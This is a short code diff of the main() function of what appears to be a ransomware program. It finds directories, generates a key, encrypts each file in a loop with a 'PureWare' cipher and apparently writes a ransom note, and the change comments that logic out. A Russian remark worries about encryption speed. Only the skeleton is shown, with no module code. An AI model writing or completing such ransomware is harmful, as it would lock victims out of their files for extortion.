@@ -59,7 +59,7 @@ public:
 
 int main(void)
 {
-    setlocale(LC_ALL, "Russian");
+    /*setlocale(LC_ALL, "Russian");
     FileModule fileModule;
     fileModule.FindDirectory();
 
@@ -68,14 +68,14 @@ int main(void)
     key.KeyGen();
 
     CipherModule PureWare(key.key);
-    NoteModule note;
+    NoteModule note;*/
 
     // Нужно подумать как это дерьмо оптимизировать, кажется сейчас оно будет шифровать супер медленно
-    for (; !endProgramExecution;) {
+    /*for (; !endProgramExecution;) {
         PureWare.Cipher(fileModule.GetNextFile());
-    }
+    }*/
 
-    note.MakeSomeShit();
+    /*note.MakeSomeShit();*/
 
     return 0;
 }
